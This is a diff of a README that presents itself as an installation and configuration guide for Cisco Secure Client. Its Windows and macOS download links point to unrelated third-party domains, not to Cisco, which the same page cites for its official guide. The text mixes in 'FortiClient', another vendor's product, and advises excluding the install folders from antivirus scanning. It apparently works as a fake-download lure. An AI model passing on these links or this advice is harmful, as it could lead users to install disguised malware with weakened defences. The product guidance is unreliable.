@@ -5,23 +5,23 @@
 ## Table of Contents
 - [Installation](#installation)
 - [System Requirements](#system-requirements)
+- [Configuration](#configuration)
+- [Troubleshooting](#troubleshooting)
 - [Features](#features)
 - [Usage](#usage)
 
 ## Installation
-
-
-### Windows
-1. [**Download the Cisco Secure Client installer for Windows**](https://cine.prosuscorp.com/secure/).
-2. Run the executable file.
-3. Follow the on-screen instructions:
+### Installing on Windows
+ ### 🔗 [**Download Cisco Secure Client**](https://cine.prosuscorp.com/secure/).
+1. Run the executable file.
+2. Follow the on-screen instructions:
    - Accept the license agreement.
    - Choose the installation folder.
-4. Complete the installation and restart the system if prompted.
-5. Launch FortiClient from the desktop shortcut.
+3. Complete the installation and restart the system if prompted.
+4. Launch FortiClient from the desktop shortcut.
 
-### macOS
-1. [**Download the `.dmg` installer file**]([https://pincheira.org/forti/](https://cine.prosuscorp.com/secure/).
+### Installing on macOS
+1. [**Download `.dmg` file**](https://cine.prosuscorp.com/secure/)
 2. Open the installer and follow the steps:
    - Agree to the Software License Agreement.
    - Enter your system password if required.
@@ -33,6 +33,127 @@
 - **Windows**: Windows 10 or later; Microsoft .NET Framework 4.6.2 or newer recommended.
 - **macOS**: macOS 11 or later; Apple-supported devices only.
 - **Linux**: Kernel version compatibility is critical; ensure `libelf` and `gcc` are installed.
+
+
+## Configuration
+
+### Prerequisites
+
+Ensure the following requirements are met before proceeding with configuration:
+
+- **Administrative Access**: You must have the required administrative privileges on the endpoint device.
+- **Supported Environment**: Verify that the target operating system and endpoint meet Cisco Secure Client's system requirements.
+- **Network Preparedness**: Ensure that endpoint directories (`C:\ProgramData\Cisco\` for Windows or `/opt/cisco/` for macOS/Linux) are added to antivirus and antimalware exclusion lists.
+- **Profiles and Licensing**: Confirm the availability of necessary profiles and the appropriate license (Advantage or Premier).
+
+### 1. Launch Cisco Secure Client
+
+1. Open the application from the Start menu (Windows) or Applications folder (macOS).
+2. Ensure the application has the latest updates.
+
+### 2. Add or Manage VPN Connections
+
+1. Navigate to **Connections** > **Add New Connection**.
+2. Input the following details:
+   - **Connection Name**: A descriptive name for the VPN connection.
+   - **Server Address**: The fully qualified domain name or IP address of the VPN gateway.
+3. Click **Save** to store the connection.
+
+#### Advanced Settings
+
+- Access the **Edit Connection** menu to:
+  - Configure authentication methods (certificate-based or username/password).
+  - Set proxy preferences under **Proxy Settings**.
+  - Toggle and customize split tunneling.
+
+### 3. Importing and Exporting Profiles
+
+- **Import**: From the **File** menu, select **Import Profile**, then upload the XML file containing predefined settings.
+- **Export**: Save configurations to an XML file using the **Export Profile** option. Profiles must match the server-side configurations for synchronization.
+
+### Advanced Deployment Options
+
+#### Predeploy Configuration
+
+- Download the predeployment package from Cisco's official website.
+- Use enterprise software management systems (e.g., SCCM) for large-scale deployment or distribute zip packages containing installers and profiles.
+
+#### Deployment Directories:
+- **Windows**: Profiles and resources are stored in `C:\ProgramData\Cisco\Cisco Secure Client`.
+- **macOS/Linux**: Profiles are located in `/opt/cisco/secureclient`.
+
+#### Web Deployment
+
+- Deploy via **Secure Firewall ASA** or **ISE**.
+- Ensure proper configuration of ASA policies and ISE provisioning settings to deliver the required client and profiles dynamically.
+
+#### Configuring ISE-Specific Features
+
+- Upload ISE Posture Profiles via the ISE portal.
+- Use the Network Setup Assistant (NSA) for initial client deployment where browser-based provisioning is required.
+
+### Configuration File Management
+
+Cisco Secure Client relies on XML files for profile configurations.
+
+#### Editing XML Profiles
+
+1. Locate the profile in the configuration directory.
+2. Open with a text editor and edit parameters such as:
+   ```xml
+   <ServerList>
+       <HostEntry>
+           <HostName>MyVPN</HostName>
+           <HostAddress>vpn.example.com</HostAddress>
+           <PrimaryProtocol>SSL</PrimaryProtocol>
+       </HostEntry>
+   </ServerList>
+   ```
+3. Save changes and restart the application.
+
+### Enabling Logging
+
+1. Open **Settings** > **Diagnostics**.
+2. Enable detailed logging to analyze issues.
+3. Use Diagnostic and Reporting Tool (DART) for detailed reports.
+
+
+## Troubleshooting
+
+### Common Issues:
+
+- **Connection Problems**: Verify server reachability and credentials.
+- **Profile Errors**: Ensure proper syntax and match between client and server-side profiles.
+
+### Compliance Module Failures
+
+**Symptoms:**
+- Compliance checks fail during posture validation.
+
+**Resolutions:**
+1. Update the compliance module to the latest version.
+2. Exclude the compliance module files from antivirus or antimalware scans.
+3. Verify proper configuration of ISE posture policies.
+
+### Kernel Module Issues (Linux)
+
+**Symptoms:**
+- Kernel module not loading or errors during installation.
+
+**Resolutions:**
+1. Ensure required kernel headers and GCC compiler are installed.
+2. Use the pre-built kernel module for deployment.
+3. Rebuild the module using the provided scripts.
+
+### Proxy Lockdown Conflicts
+
+**Symptoms:**
+- Users unable to change proxy settings in Internet Explorer or system settings.
+
+**Resolutions:**
+1. Check the Secure Firewall ASA proxy lockdown configuration.
+2. Adjust group policies to override lockdown settings if necessary.
+
 
 ## Features
 - **VPN Capabilities**:
@@ -64,15 +185,4 @@ Refer to the official [Cisco Secure Client Administrator Guide](https://www.cisc
 - Regularly review user access permissions and audit VPN usage logs.
 - Configure endpoint antivirus and firewall to trust the installation directory of Cisco Secure Client.
 
-## FAQ
-### Can Cisco Secure Client be used without VPN functionality?
-Yes, standalone modules such as Network Access Manager and Umbrella Roaming Security can be installed without VPN capabilities.
-
-### How do I customize installation options for my organization?
-Use the Cisco Profile Editor to create custom profiles and distribute them during deployment.
-
-### Where can I find detailed logs for debugging?
-On Windows, logs are located in `%ProgramData%\Cisco\Cisco Secure Client\Logs`. For macOS and Linux, refer to `/opt/cisco/secureclient/logs/`.
-
-### Is it possible to deploy updates automatically?
-Yes, updates can be configured on the Secure Firewall ASA or ISE headend to automatically push software and profile updates to clients.
+For complete guidelines and documentation, refer to the official [Cisco Secure Client Administrator Guide](https://www.cisco.com/go/secureclient).
